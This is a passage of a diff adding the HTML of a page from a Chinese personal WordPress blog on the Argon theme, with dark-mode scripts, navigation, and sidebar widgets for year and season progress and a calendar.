+					effect: "fadeIn"
+				},
+						fold_long_comments: true,
+			fold_long_shuoshuo: true,
+			disable_pjax: false,
+			pjax_animation_durtion: 600,
+			headroom: "true",
+			waterflow_columns: "1",
+			code_highlight: {
+				enable: true,
+				hide_linenumber: true,
+				transparent_linenumber: false,
+				break_line: false			}
+		}
+	</script>
+	<script>
+		var darkmodeAutoSwitch = "time";
+		function setDarkmode(enable){
+			if (enable == true){
+				$("html").addClass("darkmode");
+			}else{
+				$("html").removeClass("darkmode");
+			}
+			$(window).trigger("scroll");
+		}
+		function toggleDarkmode(){
+			if ($("html").hasClass("darkmode")){
+				setDarkmode(false);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
+			}else{
+				setDarkmode(true);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
+			}
+		}
+		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
+			setDarkmode(true);
+		}
+		function toggleDarkmodeByPrefersColorScheme(media){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			if (media.matches){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		function toggleDarkmodeByTime(){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			let hour = new Date().getHours();
+			if (hour < 7 || hour >= 22){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		if (darkmodeAutoSwitch == 'system'){
+			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
+			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
+			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
+		}
+		if (darkmodeAutoSwitch == 'time'){
+			toggleDarkmodeByTime();
+		}
+		if (darkmodeAutoSwitch == 'alwayson'){
+			setDarkmode(true);
+		}
+
+		function toggleAmoledDarkMode(){
+			$("html").toggleClass("amoled-dark");
+			if ($("html").hasClass("amoled-dark")){
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
+			}else{
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
+			}
+		}
+		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
+			$("html").addClass("amoled-dark");
+		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
+			$("html").removeClass("amoled-dark");
+		}
+	</script>
+	<script>
+		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
+			$("html").addClass("using-safari");
+		}
+	</script>
+
+			<script src="https://yhalo.cn/wp-content/themes/argon/assets/vendor/smoothscroll/smoothscroll1_pulse.js"></script>
+		
+
+
+	
+	
+	
+	
+	
+	
+	
+	
+<style id="core-block-supports-inline-css">
+.wp-elements-1 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--pale-pink);}.wp-elements-2 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--vivid-red);}.wp-elements-3 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--pale-pink);}.wp-elements-4 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--vivid-red);}
+/*# sourceURL=core-block-supports-inline-css */
+</style>
+
+</head>
+
+
+<style id="themecolor_css">
+		:root{
+		--themecolor: #607d8b;
+		--themecolor-R: 96;
+		--themecolor-G: 125;
+		--themecolor-B: 139;
+		--themecolor-H: 200;
+		--themecolor-S: 18;
+		--themecolor-L: 46;
+	}
+</style>
+<style id="theme_cardradius_css">
+	:root{
+		--card-radius: 15px;
+	}
+</style>
+
+<body class="wp-singular post-template-default single single-post postid-1978 single-format-standard wp-theme-argon">
+<div id="toolbar">
+	<header class="header-global">
+		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
+			<div class="container">
+				<button id="open_sidebar" class="navbar-toggler" type="button" aria-expanded="false" aria-label="Toggle sidebar">
+					<span class="navbar-toggler-icon"></span>
+				</button>
+				<div class="navbar-brand mr-0">
+															<a class="navbar-brand navbar-title" href="https://yhalo.cn">YHalo</a>
+				</div>
+				<div class="navbar-collapse collapse" id="navbar_global">
+					<div class="navbar-collapse-header">
+						<div class="row" style="display: none;">
+							<div class="col-6 collapse-brand"></div>
+							<div class="col-6 collapse-close">
+								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+									<span></span>
+									<span></span>
+								</button>
+							</div>
+						</div>
+						<div class="input-group input-group-alternative">
+							<div class="input-group-prepend">
+								<span class="input-group-text"><i class="fa fa-search"></i></span>
+							</div>
+							<input id="navbar_search_input_mobile" class="form-control" placeholder="搜索什么..." type="text" autocomplete="off">
+						</div>
+					</div>
+					<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
+
+										<li class='nav-item'>
+											<a href='https://yhalo.cn/' class='nav-link' target='' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont"></span> 首页</span>
+										  </a>
+</li>
+
+										<li class='nav-item dropdown'>
+											<a href='https://yhalo.cn/category/article/' class='nav-link' data-toggle='dropdown' no-pjax onclick='return false;' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont"></span> 文章</span>
+										  </a>
+<div class="dropdown-menu">
+<a href='https://yhalo.cn/category/article/wp/' class='dropdown-item' target='' title=''><span class="iconfont"></span> wp</a><a href='https://yhalo.cn/category/article/%e6%8a%80%e6%9c%af/' class='dropdown-item' target='' title=''><span class="iconfont"></span> 技术</a><a href='https://yhalo.cn/category/article/%e7%ac%94%e8%ae%b0/' class='dropdown-item' target='' title=''><span class="iconfont">&#xe650;</span> 笔记</a>
+</div>
+
+</li>
+
+										<li class='nav-item'>
+											<a href='https://yhalo.cn/%e7%95%99%e8%a8%80%e6%9d%bf/' class='nav-link' target='' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont"></span> 留言板</span>
+										  </a>
+</li>
+
+										<li class='nav-item'>
+											<a href='https://yhalo.cn/%e7%a2%8e%e7%a2%8e%e5%bf%b5/' class='nav-link' target='' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont"></span> 碎碎念</span>
+										  </a>
+</li>
+
+										<li class='nav-item'>
+											<a href='https://yhalo.cn/%e5%8f%8b%e9%93%be/' class='nav-link' target='' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont">&#xe901;</span> 友链</span>
+										  </a>
+</li>
+
+										<li class='nav-item'>
+											<a href='https://www.travellings.cn/go.html' class='nav-link' target='' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont">&#xe627;</span> 开往</span>
+										  </a>
+</li>
+
+										<li class='nav-item'>
+											<a href='https://yhalo.cn/%e5%85%b3%e4%ba%8e/' class='nav-link' target='' title=''>
+										  		<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'><span class="iconfont"></span> 关于</span>
+										  </a>
+</li></ul>					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li id="navbar_search_container" class="nav-item" data-toggle="modal">
+							<div id="navbar_search_input_container">
+								<div class="input-group input-group-alternative">
+									<div class="input-group-prepend">
+										<span class="input-group-text"><i class="fa fa-search"></i></span>
+									</div>
+									<input id="navbar_search_input" class="form-control" placeholder="搜索什么..." type="text" autocomplete="off">
+								</div>
+							</div>
+						</li>
+					</ul>
+				</div>
+				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon navbar-toggler-searcg-icon"></span>
+				</button>
+			</div>
+		</nav>
+	</header>
+</div>
+<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">搜索</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<form id="argon_serach_form" method="get" action="https://yhalo.cn">
+	<div class="form-group mb-3">
+		<div class="input-group input-group-alternative">
+			<div class="input-group-prepend">
+				<span class="input-group-text"><i class="fa fa-search"></i></span>
+			</div>
+			<input name="s" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" >
+		</div>
+	</div>
+	<div class="text-center">
+		<button onclick="if($('#argon_serach_form input[name=\'s\']').val() != '') {document.getElementById('argon_serach_form').submit();}" type="button" class="btn btn-primary">搜索</button>
+	</div>
+</form>			</div>
+		</div>
+	</div>
+</div>
+<!--Banner-->
+<section id="banner" class="banner section section-lg section-shaped">
+	<div class="shape  shape-primary">
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+	</div>
+
+		<div id="banner_container" class="banner-container container text-center">
+					<div class="banner-title text-white" data-interval="100"><span data-text="YHalo's Blog" class="banner-title-inner">&nbsp;</span>
+			<span data-text="Greetings. Traveller from beyond the Fog." class="banner-subtitle d-block">&nbsp;</span></div>
+			</div>
+			<style>
+			section.banner{
+				background-image: url(//bing.com/th?id=OHR.PipiwaiTrail_ZH-CN1811194311_1920x1080.jpg&rf=LaDigue_1920x1080.jpg&pid=hp) !important;
+			}
+		</style>
+				<div class="cover-scroll-down">
+			<i class="fa fa-angle-down" aria-hidden="true"></i>
+		</div>
+	</section>
+
+	<style>
+					#banner, #banner .shape {
+				background: transparent !important;
+			}
+				#content:before {
+			content: '';
+			display: block;
+			position: fixed;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			z-index: -2;
+			background: url( https://cdn.yhalo.cn/back/Yhaloleda.webp);
+			background-position: center;
+			background-size: cover;
+			background-repeat: no-repeat;
+			opacity: 0.7;
+			transition: opacity .5s ease;
+		}
+		html.darkmode #content:before{
+			filter: brightness(0.65);
+		}
+					#content:after {
+				content: '';
+				display: block;
+				position: fixed;
+				left: 0;
+				right: 0;
+				top: 0;
+				bottom: 0;
+				z-index: -2;
+				background: url(https://cdn.yhalo.cn/back/Yhalonight.webp);
+				background-position: center;
+				background-size: cover;
+				background-repeat: no-repeat;
+				opacity: 0;
+				transition: opacity .5s ease;
+			}
+			html.darkmode #content:after {
+				opacity: 0.7;
+			}
+			html.darkmode #content:before {
+				opacity: 0;
+			}
+			</style>
+
+	<style>
+		#banner:after {
+			content: '';
+			width: 100vw;
+			position: absolute;
+			left: 0;
+			top: 0;
+			height: 120px;
+			background: linear-gradient(180deg, rgba(0,0,0,0.25) 0%, rgba(0,0,0,0.15) 35%, rgba(0,0,0,0) 100%);
+			display: block;
+			z-index: -1;
+		}
+		.banner-title {
+			text-shadow: 0 5px 15px rgba(0, 0, 0, .2);
+		}
+	</style>
+
+<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
+	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
+		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
+		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
+	</button>
+	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
+		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
+	</button>
+	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button"  style='display: none;' aria-label="Comment" tooltip="评论">
+		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
+	</button>
+	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
+		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
+	</button>
+	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Blog Settings Menu" tooltip="设置">
+		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
+	</button>
+	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
+		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
+		
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">字体</div>
+			<div>
+			<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">HarmonyOS Sans</button>
+			<button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">OPPOSans</button>
+			
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">阴影</div>
+			<div>
+				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3 mb-3">
+			<div style="flex: 1;">滤镜</div>
+			<div id="blog_setting_filters" class="ml-3">
+				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
+				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
+				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
+				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mb-3">
+			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
+			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
+				<div id="blog_setting_card_radius"></div>
+			</div>
+		</div>
+			</div>
+	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
+		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
+		<span id="fabtn_reading_progress_details">0%</span>
+	</button>
+</div>
+
+<div id="content" class="site-content">
+
+	
+	
+<script>
+  document.addEventListener('click', function (e) {
+    const effect = document.createElement('div');
+    effect.className = 'click-effect';
+    effect.style.left = `${e.clientX}px`;
+    effect.style.top = `${e.clientY}px`;
+    document.body.appendChild(effect);
+    setTimeout(() => effect.remove(), 600);
+  });
+</script>
+
+	
+	
+
+<div class="page-information-card-container"></div>
+
+<div id="sidebar_mask"></div>
+<aside id="leftbar" class="leftbar widget-area" role="complementary">
+					<div id="leftbar_announcement" class="card bg-white shadow-sm border-0">
+				<div class="leftbar-announcement-body">
+					<div class="leftbar-announcement-title text-white">公告</div>
+					<div class="leftbar-announcement-content text-white">中国人能飞</div>
+				</div>
+			</div>
+				<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
+			<div class="leftbar-banner card-body">
+				<span class="leftbar-banner-title text-white">今日一言</span>
+
+													<span class="leftbar-banner-subtitle text-white"><span class='hitokoto'></span></span>
+				
+			</div>
+
+			<ul id='leftbar_part1_menu' class='leftbar-menu'>
+
+						<li class='leftbar-menu-item'>
+							<a href='https://yhalo.cn/' target=''><span class="iconfont"></span> 首页</a></li>
+
+						<li class='leftbar-menu-item'>
+							<a href='https://yhalo.cn/category/article/' target=''><span class="iconfont"></span> 文章</a></li>
+
+						<li class='leftbar-menu-item'>
+							<a href='https://yhalo.cn/%e7%a2%8e%e7%a2%8e%e5%bf%b5/' target=''><span class="iconfont"></span> 碎碎念</a></li>
+
+						<li class='leftbar-menu-item'>
+							<a href='https://yhalo.cn/%e5%bd%92%e6%a1%a3/' target=''><span class="iconfont">&#xe743;</span> 归档</a></li></ul>			<div class="card-body text-center leftbar-search-button">
+				<button id="leftbar_search_container" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button">
+					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索					<input id="leftbar_search_input" type="text" placeholder="搜索什么..." class="form-control form-control-alternative" autocomplete="off">
+				</button>
+			</div>
+		</div>
+		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
+			<div id="leftbar_part2_inner" class="card-body">
+								<div class="nav-wrapper" style="padding-top: 5px;">
+	                <ul class="nav nav-pills nav-fill" role="tablist">
+													<li class="nav-item sidebar-tab-switcher">
+								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
+							</li>
+												<li class="nav-item sidebar-tab-switcher">
+							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
+						</li>
+													<li class="nav-item sidebar-tab-switcher">
+								<a class="" id="leftbar_tab_tools_btn" data-toggle="tab" href="#leftbar_tab_tools" role="tab" aria-controls="leftbar_tab_tools" no-pjax>功能</a>
+							</li>
+							                </ul>
+				</div>
+				<div>
+					<div class="tab-content" style="padding: 10px 10px 0 10px;">
+													<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
+								<div id="leftbar_catalog"></div>
+								<script type="text/javascript">
+									$(function () {
+										$(document).headIndex({
+											articleWrapSelector: '#post_content',
+											indexBoxSelector: '#leftbar_catalog',
+											subItemBoxClass: "index-subItem-box",
+											itemClass: "index-item",
+											linkClass: "index-link",
+											offset: 80,
+										});
+									})
+								</script>
+															</div>
+												<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
+							<a
+  href="https://yhalo.cn/%E5%85%B3%E4%BA%8E/"
+  class="sidebar-avatar-link"
+  aria-label="关于我"
+>
+  <div id="leftbar_overview_author_image"
+       style="background-image: url(https://cdn.yhalo.cn/back/yhalo.jpg)"
+       class="rounded-circle shadow-sm"
+       aria-hidden="true"></div>
+</a>
+
+							<h6 id="leftbar_overview_author_name">YHalo</h6>
+							<h6 id="leftbar_overview_author_description">我受够了繁文缛节！</h6>							<nav class="site-state">
+								<div class="site-state-item site-state-posts">
+									<a  style="cursor: default;">
+										<span class="site-state-item-count">43</span>
+										<span class="site-state-item-name">文章</span>
+									</a>
+								</div>
+								<div class="site-state-item site-state-categories">
+									<a data-toggle="modal" data-target="#blog_categories">
+										<span class="site-state-item-count">5</span>
+										<span class="site-state-item-name">分类</span>
+									</a>
+								</div>      
+								<div class="site-state-item site-state-tags">
+									<a data-toggle="modal" data-target="#blog_tags">
+										<span class="site-state-item-count">41</span>
+										<span class="site-state-item-name">标签</span>
+									</a>
+								</div>
+							</nav>
+							<div class='site-author-links'>
+
+											<div class='site-author-links-item'>
+												<a href='https://github.com/YHalo-wyh' rel='noopener' target='_blank'><span class="iconfont"></span>  Github</a></div>
+
+											<div class='site-author-links-item'>
+												<a href='https://blog.csdn.net/2401_87558262?type=blog' rel='noopener' target='_blank'><span class="iconfont"></span> CSDN</a></div>
+
+											<div class='site-author-links-item'>
+												<a href='mailto:wangyaohui196@gmail.com' rel='noopener' target='_blank'><span class="iconfont"></span> 邮箱</a></div>
+
+											<div class='site-author-links-item'>
+												<a href='https://yhalo.cn/feed/' rel='noopener' target='_blank'><span class="iconfont"></span> RSS</a></div></div>							<div style='height: 20px;'></div>															<div id="leftbar_siteinfo_extra_tools">
+									<div id="block-17" class="widget widget_block card bg-white border-0"></div>								</div>
+													</div>
+													<div class="tab-pane fade" id="leftbar_tab_tools" role="tabpanel" aria-labelledby="leftbar_tab_tools_btn">
+								<div id="block-7" class="widget widget_block card bg-white border-0"><div class="progress-wrapper" style="padding: 0">
+  <!-- 年份进度条 --></p>
+<div class="progress-info">
+<div class="progress-label">
+      <span id="yearprogress_yearname" style="font-size: 1.3em; font-weight: bold"></span>
+    </div>
+<div id="yearprogress_text_container" class="progress-percentage">
+      <span id="yearprogress_progresstext" style="font-weight: bold"></span><br />
+      <span id="yearprogress_progresstext_full" style="font-weight: bold"></span>
+    </div>
+</p></div>
+<div class="progress">
+<div id="yearprogress_progressbar" class="progress-bar bg-primary"></div>
+</p></div>
+<p>  <!-- 季节进度条 --></p>
+<div class="progress-info" style="margin-top: 12px; display: flex; align-items: center; justify-content: space-between">
+<div style="display: flex; align-items: center; gap: 8px">
+      <span id="season_icon" style="font-size: 1.2em">🌱</span><br />
+      <span id="season_name" style="font-weight: normal"></span>
+    </div>
+<div id="season_text_container" class="progress-percentage">
+      <span id="season_progresstext" style="font-weight: normal"></span><br />
+      <span id="season_progresstext_full" style="font-weight: normal"></span>
+    </div>
+</p></div>
+<div class="progress">
+<div id="season_progressbar" class="progress-bar"></div>
+</p></div>
+</div>
+<p><script no-pjax="">
+function getSeason(month) {
+  if (month >= 2 && month <= 4) return {name: "春季", startMonth: 2, endMonth: 4, color: '#4cff7e', icon: '🌱'};
+  if (month >= 5 && month <= 7) return {name: "夏季", startMonth: 5, endMonth: 7, color: '#dc4437', icon: '☀️'};
+  if (month >= 8 && month <= 10) return {name: "秋季", startMonth: 8, endMonth: 10, color: '#ffcc4c', icon: '🍂'};
+  return {name: "冬季", startMonth: 11, endMonth: 1, color: '#4ccbff', icon: '❄️'};
+}
+
+function yearprogress_refresh() {
+  // 组件不在当前页面就不跑（防止某些页面没小工具时报错）
+  if (!document.getElementById("yearprogress_yearname")) return;
+
+  let now = new Date();
+  let year = now.getFullYear();
+  $("#yearprogress_yearname").text(year);
+
+  let from = new Date(year, 0, 1, 0, 0, 0);
+  let to = new Date(year, 11, 31, 23, 59, 59);
+
+  let progress = (((now - from) / (to - from + 1)) * 100).toFixed(7);
+  let progressshort = (((now - from) / (to - from + 1)) * 100).toFixed(2);
+
+  $("#yearprogress_progresstext").text(progressshort + "%");
+  $("#yearprogress_progresstext_full").text(progress + "%");
+  $("#yearprogress_progressbar").css({
+    "width": progress + "%",
+    "background-color": "#607d8b"
+  });
+
+  const yearColor = "#607d8b";
+  $("#yearprogress_yearname").css("color", yearColor);
+  $("#yearprogress_progresstext").css("color", yearColor);
+  $("#yearprogress_progresstext_full").css("color", yearColor);
+
+  // ====== 季节（修复冬季跨年）======
+  const month = now.getMonth(); // 0~11（0=1月） :contentReference[oaicite:1]{index=1}
+  const season = getSeason(month);
+
+  let startYear = year;
+  let endYear = year;
+
+  // 冬季：12月属于当年冬季；1~2月属于上一年冬季，但结束在当年2月
+  if (season.name === "冬季") {
+    if (month === 11) {          // 12月
+      startYear = year;
+      endYear = year + 1;
+    } else {                     // 1~2月（month=0/1）
+      startYear = year - 1;
+      endYear = year;
+    }
+  }
+
+  let seasonStart = new Date(startYear, season.startMonth, 1, 0, 0, 0);
+  // “下个月第0天”=本月最后一天（常用取月末方法）
+  let seasonEnd = new Date(endYear, season.endMonth + 1, 0, 23, 59, 59);
+
+  let seasonProgress = ((now - seasonStart) / (seasonEnd - seasonStart)) * 100;
+  if (seasonProgress > 100) seasonProgress = 100;
+  if (seasonProgress < 0) seasonProgress = 0;
+
+  $("#season_name").text(season.name);
+  $("#season_progresstext").text(seasonProgress.toFixed(2) + "%");
+  $("#season_progresstext_full").text(seasonProgress.toFixed(7) + "%");
+  $("#season_progressbar").css("width", seasonProgress + "%");
+
+  $("#season_name").css("color", season.color);
+  $("#season_progresstext").css("color", season.color);
+  $("#season_progresstext_full").css("color", season.color);
+  $("#season_icon").text(season.icon);
+  $("#season_progressbar").css("background-color", season.color);
+}
+
+// 初始化 + 防止 interval 叠加
+yearprogress_refresh();
+if (window.__yearProgressIntervalId) clearInterval(window.__yearProgressIntervalId);
+window.__yearProgressIntervalId = setInterval(yearprogress_refresh, 500);
+</script></p>
+<style>
+#yearprogress_text_container, #season_text_container {
+  width: 100%;
+  height: 22px;
+  overflow: hidden;
+  user-select: none;
+}
+#yearprogress_text_container > span, #season_text_container > span {
+  transition: all 0.3s ease;
+  display: block;
+}
+#yearprogress_text_container:hover > span, #season_text_container:hover > span {
+  transform: translateY(-45px);
+}</p>
+<p>#season_progressbar {
+  transition: width 0.5s ease, background-color 0.5s ease;
+}</p>
+<p>#yearprogress_yearname {
+  transition: font-size 0.3s ease;
+}</p>
+<p>/* 季节字体变细 */
+#season_name, #season_progresstext, #season_progresstext_full {
+  font-weight: normal !important;
+}
+</style>
+</div><div id="block-20" class="widget widget_block card bg-white border-0"><div class="progress-wrapper" style="padding: 0; max-width: 350px; font-family: Arial, sans-serif;"> 
+  <div class="progress-info" style="text-align: center; margin-bottom: 12px; display: flex; justify-content: center; align-items: center; gap: 16px;">
+    <button id="prev_month" class="month-button"><</button>
+    <span id="calendar_month" style="font-size: 1.3em; font-weight: bold; min-width: 120px;"></span>
+    <button id="next_month" class="month-button">></button>
+  </div>
+  <div class="calendar-weekdays" style="display: grid; grid-template-columns: repeat(7, 1fr); font-weight: bold; text-align: center; padding-bottom: 6px; border-bottom: 1px solid #ccc;">
+    <div>日</div><div>一</div><div>二</div><div>三</div><div>四</div><div>五</div><div>六</div>
+  </div>
+  <div id="calendar_grid" class="calendar-grid" style="display: grid; grid-template-columns: repeat(7, 1fr); gap: 4px; padding-top: 8px;"></div>
+</div>
+
+<style>
+.month-button {
+  cursor: pointer;
+  font-size: 1.2em;
+  border: none;
+  background: none;
+  color: #333;
+  border-radius: 6px;
+  padding: 4px 8px;
+  transition: background-color 0.3s, color 0.3s;
+}
+.month-button:hover {
+  background-color: #607d8b;
+  color: #fff;
+}
+</style>
+
+<script>
+(function(){
+  const grid = document.getElementById('calendar_grid');
+  const monthSpan = document.getElementById('calendar_month');
+  const prevBtn = document.getElementById('prev_month');
+  const nextBtn = document.getElementById('next_month');
+
+  let currentDate = new Date();
+  let year = currentDate.getFullYear();
+  let month = currentDate.getMonth();
+
+  function renderCalendar(y, m){
+    const now = new Date();
+    const todayY = now.getFullYear();
+    const todayM = now.getMonth();
+    const todayD = now.getDate();
+
+    monthSpan.textContent = `${y}年${m+1}月`;
+    grid.innerHTML = '';
+
+    const firstDay = new Date(y, m, 1).getDay();
+    const daysInMonth = new Date(y, m+1, 0).getDate();
+
+    for(let i=0; i<firstDay; i++){
+      const emptyDiv = document.createElement('div');
+      emptyDiv.style.minHeight = '40px';
+      grid.appendChild(emptyDiv);
+    }
+
+    for(let day=1; day<=daysInMonth; day++){
+      const dayDiv = document.createElement('div');
+      dayDiv.style.minHeight = '40px';
+      dayDiv.style.display = 'flex';
+      dayDiv.style.alignItems = 'center';
+      dayDiv.style.justifyContent = 'center';
+      dayDiv.style.borderRadius = '6px';
+      dayDiv.style.userSelect = 'none';
+      dayDiv.style.transition = 'background-color 0.3s, color 0.3s';
+      dayDiv.style.cursor = 'default';
+
+      const isPastDate = (y < todayY) || (y === todayY && m < todayM) || (y === todayY && m === todayM && day < todayD);
+      const isToday = (y === todayY && m === todayM && day === todayD);
+      const isFuture = (y > todayY) || (y === todayY && m > todayM) || (y === todayY && m === todayM && day > todayD);
+      const monthParam = m + 1;
+
+      if(isPastDate || isToday){
+        dayDiv.textContent = day;
+        dayDiv.style.cursor = 'pointer';
+
+        if (isToday) {
+          dayDiv.style.backgroundColor = '#2196f3';
+          dayDiv.style.color = 'white';
+          dayDiv.style.fontWeight = 'bold';
+        }
+
+        dayDiv.addEventListener('mouseenter', () => {
+          dayDiv.style.backgroundColor = '#607d8b';
+          dayDiv.style.color = '#fff';
+        });
+        dayDiv.addEventListener('mouseleave', () => {
+          if (isToday) {
+            dayDiv.style.backgroundColor = '#2196f3';
+            dayDiv.style.color = '#fff';
+          } else {
+            dayDiv.style.backgroundColor = 'transparent';
+            dayDiv.style.color = ''; // 恢复默认字体颜色（继承）
+          }
+        });
+        dayDiv.addEventListener('click', () => {
+          window.open(`https://www.readlishi.com/?month=${monthParam}&day=${day}`, '_blank');
+        });
+
+      } else if(isFuture){
+        dayDiv.textContent = day;
+        dayDiv.style.color = '#607d8b';
+      }
+
+      grid.appendChild(dayDiv);
+    }
+  }
+
+  prevBtn.onclick = () => {
+    month--;
+    if(month < 0){
+      month = 11;
+      year--;
+    }
+    renderCalendar(year, month);
+  };
+
+  nextBtn.onclick = () => {
+    month++;
+    if(month > 11){
+      month = 0;
+      year++;
+    }
+    renderCalendar(year, month);
+  };
+
+  renderCalendar(year, month);
+})();
+</script></div>							</div>
+											</div>
+				</div>
+			</div>
+		</div>
+</aside>
+<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">分类</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
